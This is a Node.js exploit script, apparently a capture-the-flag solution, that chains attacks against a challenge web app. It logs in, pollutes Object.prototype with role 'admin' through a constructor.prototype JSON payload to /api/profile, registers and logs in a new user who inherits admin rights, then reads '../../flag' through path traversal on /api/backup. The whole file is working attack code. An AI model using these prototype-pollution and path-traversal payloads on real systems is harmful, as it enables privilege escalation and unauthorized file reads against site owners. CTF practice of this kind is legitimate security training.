
const http = require('http');
const querystring = require('querystring');

// Proper order:
// 1. Login existing user
// 2. Poison Object.prototype.role = admin via /api/profile (this works because constructor.prototype doesn't get blocked)
// 3. THEN register new user - it gets role=admin from prototype
// 4. Login new user, get flag

console.log("🚀 Starting proper order...");
console.log("Step 1: Login existing user...");

const existingUid = "2ca01c4924cc40e5b0c303f33d0aa184";
const loginData = querystring.stringify({uid: existingUid});

const loginOpts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(loginData)
  }
};

const loginReq = http.request(loginOpts, (res) => {
  const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
  console.log("✅ Step 1 done: Logged in");
  console.log("Step 2: Poisoning Object.prototype.role = 'admin'...");

  const poisonData = JSON.stringify({
    uid: existingUid,
    "constructor": {
      "prototype": {
        "role": "admin"
      }
    }
  });

  const poisonOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(poisonData),
      'Cookie': cookie
    }
  };

  const poisonReq = http.request(poisonOpts, (poisonRes) => {
    let poisonBody = '';
    poisonRes.on('data', chunk => poisonBody += chunk);
    poisonRes.on('end', () => {
      console.log("✅ Step 2 done: Poisoning complete");
      console.log("Step 3: Register new user (inherits role=admin)...");

      const regData = querystring.stringify({username: "finalfinaladmin"});
      const regOpts = {
        hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
        port: 80,
        path: '/register',
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(regData)
        }
      };

      const regReq = http.request(regOpts, (regRes) => {
        let regBody = '';
        regRes.on('data', chunk => regBody += chunk);
        regRes.on('end', () => {
          const match = regBody.match(/<span.*?>([a-f0-9]+)<\/span>/);
          if (match) {
            const newUid = match[1];
            console.log(`✅ Registered new user, UID: ${newUid}`);
            console.log("Step 4: Login new user...");

            const newLoginData = querystring.stringify({uid: newUid});
            const newLoginOpts = {
              hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
              port: 80,
              path: '/login',
              method: 'POST',
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(newLoginData)
              }
            };

            const newLoginReq = http.request(newLoginOpts, (newLoginRes) => {
              const newCookie = newLoginRes.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
              console.log("✅ Logged in, getting flag...");

              const flagData = querystring.stringify({file: '../../flag'});
              const flagOpts = {
                hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
                port: 80,
                path: '/api/backup',
                method: 'POST',
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Content-Length': Buffer.byteLength(flagData),
                  'Cookie': newCookie
                }
              };

              const flagReq = http.request(flagOpts, (flagRes) => {
                let flagBody = '';
                flagRes.on('data', chunk => flagBody += chunk);
                flagRes.on('end', () => {
                  console.log("\n\n🎯🎯🎯 FINAL FLAG RESULT:");
                  console.log(flagBody);
                });
              });
              flagReq.write(flagData);
              flagReq.end();
            });
            newLoginReq.write(newLoginData);
            newLoginReq.end();
          }
        });
        regReq.write(regData);
        regReq.end();
      });
    });
  });
  poisonReq.write(poisonData);
  poisonReq.end();
});

loginReq.on('error', err => console.error(err));
loginReq.write(loginData);
loginReq.end();
